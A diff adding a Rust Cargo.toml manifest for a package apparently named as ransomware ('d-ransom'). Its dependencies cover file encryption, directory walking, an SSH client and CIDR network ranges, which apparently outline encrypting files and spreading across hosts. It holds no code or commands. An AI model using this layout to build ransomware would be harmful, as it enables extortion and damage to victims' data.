@@ -1,0 +1,18 @@
+[package]
+name = "d-ransom"
+version = "2.1.0"
+edition = "2021"
+
+[dependencies]
+tokio = { version = "1.0", features = ["full"] }
+anyhow = "1.0"
+clap = { version = "4.4", features = ["derive"] }
+log = "0.4"
+env_logger = "0.10"
+rand = "0.8"
+aes-gcm = "0.10"
+walkdir = "2.4"
+ssh2 = "0.9"        # Клиент SSH
+ipnetwork = "0.20"  # Работа с CIDR
+rayon = "1.8"
+reqwest = { version = "0.11", features = ["blocking"] }
